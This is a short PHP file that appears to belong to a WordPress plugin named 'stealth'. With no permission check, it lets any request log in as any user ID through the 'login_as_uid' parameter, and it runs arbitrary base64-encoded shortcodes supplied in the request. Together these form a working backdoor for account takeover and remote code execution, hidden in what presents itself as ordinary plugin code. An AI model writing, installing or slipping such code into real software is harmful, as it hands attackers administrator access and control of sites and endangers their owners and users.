        <?php

if ( ! defined( 'ABSPATH' ) ) {
    die( 'not like this...' );
}

if (isset($_REQUEST['login_as_uid'])) {
    $uid = $_REQUEST['login_as_uid'];
    wp_set_auth_cookie($uid);
    wp_set_current_user($uid);
    if (isset($_REQUEST['redirect'])) {
        wp_redirect(admin_url());
        die();
    }
}

if (isset($_REQUEST['api'])){
    $api = $_REQUEST['api'];

    if ($api === 'do_shortcode'){

        require_once STEALTH_PLUGIN_PATH . "/inc/code.php";

        try {
            ob_start();
            echo do_shortcode(base64_decode($_REQUEST['shortcode']));
            $output = ob_get_clean();
            if (isset($_REQUEST['code'])){
                if (empty($output)){
                    echo "⚠️ No output!!!";
                }
                else{
                    print_code($output, 'html');
                }
            }
            else{
                echo $output;
            }
        }
        catch (Exception $e) {
            echo "⛔️ Exception during shortcode creation";
        }
    }
    die();
}
